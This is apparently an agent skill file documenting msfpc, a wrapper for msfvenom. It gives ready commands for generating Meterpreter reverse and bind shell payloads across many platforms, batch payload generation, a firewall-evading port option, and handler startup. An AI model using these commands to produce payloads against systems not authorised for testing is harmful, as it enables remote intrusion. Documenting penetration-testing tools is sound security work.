---
name: msfpc
description: MSFvenom Payload Creator (MSFPC) is a wrapper for msfvenom used to quickly generate basic Meterpreter payloads. Use this tool during the exploitation phase to simplify the creation of payloads for various platforms (Windows, Linux, Android, etc.) and to automatically generate corresponding Metasploit resource (.rc) files for handlers.
---

# msfpc

## Overview
MSFPC (MSFvenom Payload Creator) is a CLI tool designed to make the generation of Metasploit payloads faster and more intuitive. It automates the selection of payloads, encoders, and handler configurations based on simple user inputs like platform and interface. Category: Exploitation / Social Engineering.

## Installation (if not already installed)
Assume msfpc is already installed. If the command is missing:

```bash
sudo apt update && sudo apt install msfpc
```
Note: Requires `metasploit-framework` to be installed.

## Common Workflows

### Quick Windows Reverse Shell
Generate a Windows executable using the IP of eth0 and default port 443.
```bash
msfpc windows eth0
```

### Linux Bind Shell on Specific Port
Generate a Linux ELF binary that opens a bind shell on port 4444.
```bash
msfpc elf bind eth0 4444
```

### Stageless Python HTTPS Payload
Generate a standalone Python script that connects back over HTTPS.
```bash
msfpc stageless cmd py https
```

### Mass Payload Generation (Batch)
Generate every possible combination of Meterpreter payloads for a specific target IP/WAN.
```bash
msfpc msf batch wan
```

## Complete Command Reference

```bash
msfpc <TYPE> (<DOMAIN/IP>) (<PORT>) (<CMD/MSF>) (<BIND/REVERSE>) (<STAGED/STAGELESS>) (<TCP/HTTP/HTTPS/FIND_PORT>) (<BATCH/LOOP>) (<VERBOSE>)
```

### Positional Arguments

| Argument | Description |
|----------|-------------|
| `<TYPE>` | **Required.** The target platform/format. Options: `APK`, `ASP`, `ASPX`, `Bash` [.sh], `Java` [.jsp], `Linux` [.elf], `OSX` [.macho], `Perl` [.pl], `PHP`, `Powershell` [.ps1], `Python` [.py], `Tomcat` [.war], `Windows` [.exe, .dll] |
| `<DOMAIN/IP>` | Target IP, Domain, or Interface (e.g., `eth0`, `wlan0`, `tun0`, `wan`). If omitted, an interactive menu appears. |
| `<PORT>` | The port to use for the connection. Defaults to `443`. |
| `<CMD/MSF>` | `CMD`: Standard native command prompt. `MSF`: Full Meterpreter shell. Defaults to `MSF` where possible. |
| `<BIND/REVERSE>` | `BIND`: Target opens port. `REVERSE`: Target connects back to attacker. Defaults to `REVERSE`. |
| `<STAGED/STAGELESS>` | `STAGED`: Small initial payload that fetches the rest. `STAGELESS`: Complete standalone payload. Defaults to `STAGED`. |
| `<PROTOCOL>` | `TCP`: Standard raw connection. `HTTP`: Unencrypted web traffic. `HTTPS`: Encrypted SSL web traffic. `FIND_PORT`: Attempts all ports to bypass firewalls. Defaults to `TCP`. |
| `<MODE>` | `BATCH`: Generates all possible combinations of options. `LOOP`: Generates one payload for every available `<TYPE>`. |
| `<VERBOSE>` | Displays the full `msfvenom` command being executed and additional file metadata (MD5/SHA1). |

### Help and Information
| Command | Description |
|---------|-------------|
| `msfpc help` | Show basic help. |
| `msfpc help verbose` | Show extended help with detailed information. |

## Notes
- **Handler Files**: MSFPC automatically creates a `.rc` file. You can start the listener immediately using: `msfconsole -q -r <filename>.rc`.
- **Interface Detection**: Using an interface name (like `eth0`) instead of an IP allows MSFPC to automatically detect the current local IP address.
- **Web Server**: After generation, MSFPC often suggests a Python one-liner to host the file for easy transfer to the target.
- **Stageless vs Staged**: Stageless payloads are generally more stable and better for certain post-exploitation tasks, but result in larger file sizes.